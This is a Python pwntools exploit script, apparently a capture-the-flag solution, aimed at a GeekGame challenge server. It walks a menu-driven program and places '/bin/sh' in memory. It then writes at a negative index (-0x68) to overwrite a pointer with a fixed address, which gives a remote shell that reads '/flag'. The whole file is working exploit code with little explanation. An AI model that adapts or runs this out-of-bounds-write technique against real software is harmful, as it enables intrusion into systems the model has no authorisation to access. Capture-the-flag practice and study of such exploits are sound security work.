from pwn import *
import sys
import time
token = open("../tok", "r").read().strip()
print(token)
r = remote("prob13.geekgame.pku.edu.cn", 10013)
time.sleep(2)
r.sendline(token)
time.sleep(2)

def blockread():
    while True:
        _ = r.recvline(timeout=5)
        print(_)
        if _ == b"": break

r.sendline("1")
time.sleep(1)
r.sendline("1")
time.sleep(1)
r.sendline("16")
time.sleep(1)
r.sendline("/bin/sh\0")
time.sleep(1)
r.sendline("1")
time.sleep(1)
r.sendline("2")
time.sleep(1)
r.sendline("16")
time.sleep(1)
r.sendline("aaaa")

time.sleep(1)
r.sendline("3")
time.sleep(1)
r.sendline("2")
time.sleep(1)
r.sendline(str(-0x68))
time.sleep(1)
blockread()
payload = b"\xe4\x10\x40\x00\x00\x00\x00\x00"
r.send(payload)
time.sleep(2)
blockread()

r.sendline("3")
time.sleep(1)
r.sendline("1")
blockread()
        

r.sendline("ls /")
r.sendline("cat /flag")
print(r.recvall(10))
r.close()

